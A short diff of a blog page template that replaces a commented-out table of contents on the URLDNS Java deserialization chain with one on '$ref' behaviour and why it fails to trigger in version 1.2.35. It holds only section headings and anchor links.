-        <!-- <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#URLDNS"><span class="toc-text">URLDNS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS%E8%A7%A3%E6%9E%90"><span class="toc-text">DNS解析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%93%BE%E6%8E%A5%E5%88%B0readObject"><span class="toc-text">链接到readObject</span></a></li></ol></li></ol> -->
+        <!-- <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ref"><span class="toc-text">$ref</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E8%AF%95"><span class="toc-text">调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%881-2-35-ref%E4%B8%8D%E8%83%BD%E8%A7%A6%E5%8F%91"><span class="toc-text">为什么1.2.35 $ref不能触发</span></a></li></ol> -->
         <div class="toc"></div>
       </div>
     </div>
